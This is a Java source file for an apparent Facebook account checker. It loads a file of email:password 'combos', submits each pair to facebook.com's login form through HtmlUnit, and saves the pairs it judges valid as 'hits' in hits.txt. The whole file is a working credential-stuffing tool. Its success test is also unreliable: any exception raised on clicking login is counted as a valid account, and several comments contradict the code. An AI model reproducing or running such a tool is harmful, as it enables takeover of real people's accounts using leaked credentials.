import java.awt.Color;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;

import javax.swing.JLabel;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

class facebook{
	
	// Homepage - Login page containing boxex to fill data
	HtmlPage homePage = null;
	
	// loginpage - Page we get after login whether failed or successfull
	HtmlPage loginPage = null;

	int isValid(String username, String password) {
		@SuppressWarnings("resource")
		
		// Making a webClient to automate login process
		WebClient webClient = new WebClient();
		
		// Setting CSS and JavaScript warning off so that we can see our output clearly
		java.util.logging.Logger.getLogger("com.gargoylesoftware.htmlunit").setLevel(Level.OFF);
		
		// Setting CSS off to make page load faster
		webClient.getOptions().setCssEnabled(false);
	
		// Login Check Starts here
	    try {
	    	
	    	/* This block returns exception only when there is error in loading webpage, i.e. issues with internet connection */
	    	
	    	// Opening Login Page and saving page data into Homepage variable
		    	System.out.println("Opening page");
		    	HtmlPage homePage = webClient.getPage("http://www.facebook.com/login");
		    	System.out.println("Page opened");
		    	
		    	// Finding username box to fill username/email
		        HtmlTextInput emailInput = (HtmlTextInput)homePage.getElementById("email");
		    	System.out.println("Found EMail");
		    	
		    	// Filling username into email box
		    	emailInput.setValueAttribute(username);
		    	System.out.println("Filled Email");
		    	
		    	// Finding password box to fill password
		        HtmlPasswordInput passInput = (HtmlPasswordInput)homePage.getElementById("pass");
		        System.out.println("Found Pass");
		     
		        // Filling username into password box
		    	passInput.setValueAttribute(password);
		    	System.out.println("Filled Pass");
		    	
	    	try {
	    		/* Inner Block for login testing */
	    		
	    		// Finding login button to click with a Button tag
	    		HtmlButton loginButton = (HtmlButton) homePage.getElementById("loginbutton");
	    		
	    		// Clicking button and saving data into a new page i.e. loginpage
		        loginPage = loginButton.click();
		        
		        /* 
		         
		         * If email and pass is valid, javascript functions are executed to load dynamic content of a user,
		          	but javascript function fails to execute and returns a exception.
		         * If email/pass is not valud, a static page is loaded which does not require any javascript function  to load
		         	hence not giving any error.
		         * Exception means Email-Pass is valid.
		         * No Exception means Email-Pass is not valid.
		         
		         */
		        
			} catch (Exception e) {
				// Executed when account is valid
				return 1;
			}
	    } catch (Exception e) {
	    	// Executed when there is internet connection error.
	        return 3;
	    	}
	    // Executed when account is valid as login gets it to facebook homepage 
	    if(loginPage.getUrl().toString().contains("login"))
	    	return 2;
	 // Executed when account is invalid
	    else
	    	return 1;
	}
	
}

public class facebookLoginCheck {
	
	FileReader reader = null;
	FileWriter writer = null;
	String data = "";
	String input;
	int index;
	boolean continues;
	String[] combos; 
	String[] single_combo; 
	int validCount;
	int totalCount;
	int response;
	JLabel label;
	
	facebookLoginCheck(String inputFile, JLabel label){
		this.input = inputFile;
		this.label = label;
		this.validCount = 0;
		this.totalCount = 0;
		continues = true;
	}
	
	public void doCheck(JLabel label) throws IOException {
		facebook logCheck = new facebook();
		
		try {
			reader = new FileReader(this.input);
			 while((index=reader.read())!=-1){
				 data += (char)index;
			 }
		} catch (FileNotFoundException e) {
			label.setForeground(Color.RED);
			label.setText("File not found");
			continues = false;
		}
		
		if(continues) {
		writer = new FileWriter("hits.txt");
		
		combos = data.split("\n");
		try {
			for(String combo : combos) {
				single_combo = combo.split(":");
				response = logCheck.isValid(single_combo[0],single_combo[1]);
				if(response == 1) {
					this.validCount++;
					System.out.println("Account Valid");
					writer.write(single_combo[0]+":"+single_combo[1]+"\n");
				}
				else if(response == 2) {
					System.out.println("Account Not Valid");
				}
				else {
					label.setForeground(Color.RED);
					label.setText("Check Internet Connection");
					continue;
				}
				totalCount++;
				System.out.println("Total Hits : "+validCount+"\nTotal combos Chekced "+totalCount + "\nTotal Combos Found : "+combos.length);
				label.setText("Total Hits : "+validCount+"\nTotal combos Chekced "+totalCount + "\nTotal Combos Found : "+combos.length);
			}
			label.setForeground(Color.GREEN);
			label.setText("Process Completed, all hits can be found in hits.txt file.");
		} catch (Exception e) {		}
		finally {
			System.out.println("File Closed");
			writer.close();
		}
	}
		}

}
